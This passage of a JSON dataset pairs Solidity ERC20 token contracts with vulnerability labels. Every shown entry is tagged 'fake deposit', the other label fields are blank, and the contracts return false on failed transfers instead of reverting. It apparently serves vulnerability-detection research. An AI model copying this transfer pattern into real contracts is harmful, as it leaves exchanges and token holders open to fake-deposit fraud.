                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//Cryptoken\r\n//\u023b\r\n\r\npragma solidity ^0.4.11;\r\n\r\ncontract Token {\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\ncontract StandardToken is Token {\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n}\r\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\ncontract Cryptoken is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n   \r\n\r\n\r\n    string public name = \"Cryptoken\";      \r\n    uint8 public decimals = 22;                \r\n    string public symbol = \"CTN\";\r\n    string public version = 'H1.0';    \r\n\r\n\r\n\r\n\r\n    function Cryptoken(\r\n        ) {\r\n        balances[msg.sender] = 500000000000000000000000000000000;               \r\n        totalSupply = 500000000000000000000000000000000;                       \r\n        name = \"Cryptoken\";                                  \r\n        decimals = 22;                            \r\n        symbol = \"CTN\";                               \r\n    }\r\n\r\n    \r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Sienna is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 10000000*10**uint256(decimals);\r\n    string public constant name = \"Sienna\";\r\n    string public constant symbol = \"SIENNA\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n    \r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n\r\n   \r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2021-04-24\r\n*/\r\n\r\npragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\ncontract UnboundedRegularToken is RegularToken {\r\n\r\n    uint constant MAX_UINT = 2**256 - 1;\r\n\r\n    /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\r\n    /// @param _from Address to transfer from.\r\n    /// @param _to Address to transfer to.\r\n    /// @param _value Amount to transfer.\r\n    /// @return Success of transfer.\r\n    function transferFrom(address _from, address _to, uint _value)\r\n    public\r\n    returns (bool)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n        && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract STToken is UnboundedRegularToken {\r\n\r\n    uint public totalSupply = 33*10**25;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"StarToken\";\r\n    string constant public symbol = \"ST\";\r\n\r\n    function STToken() {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\ninterface ERC20Interface {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract SYSP is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply;\r\n        _balances[msg.sender] = initialSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract FacebookToken is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000000000*10**uint256(decimals);\r\n    string public constant name = \"Facebook Token\";\r\n    string public constant symbol = \"FACE\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract KitsuneInu is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Kitsune Inu\";\r\n    string public constant symbol = \"KITSUNE\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: Unlicense\r\n\r\n// ----------------------------------------------------------------------------\r\n// 'StirFriedShrimp' token contract\r\n//\r\n// Symbol      : SFS \ud83e\udd90\r\n// Name        : Stir Fried Shrimp\r\n// Total supply: 100,000,000,000,000\r\n// Decimals    : 18\r\n// Burned      : 50%\r\n// ----------------------------------------------------------------------------\r\n\r\npragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract StirFriedShrimp is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 100000000000000*10**uint256(decimals);\r\n    string public constant name = \"Stir Fried Shrimp\";\r\n    string public constant symbol = \"SFS \ud83e\udd90\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;\r\n        totalSupply = 1000000000;\r\n        name = \"Boob Token\";\r\n        decimals = 0;\r\n        symbol = \"BOOB\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract ShibaBacon is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Shiba Bacon\";\r\n    string public constant symbol = \"INU \ud83e\udd53\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        throw;\r\n    }\r\n\r\n    string public name;\r\n    uint8 public decimals;\r\n    string public symbol;\r\n    string public version = 'H1.0';\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000;\r\n        totalSupply = 1000000000;\r\n        name = \"taco.finance\";\r\n        decimals = 0;\r\n        symbol = \"TACO\";\r\n    }\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract EthereumCyberPunks is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Ethereum Cyber Punks\";\r\n    string public constant symbol = \"EPUNK \ud83d\udc7b\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = 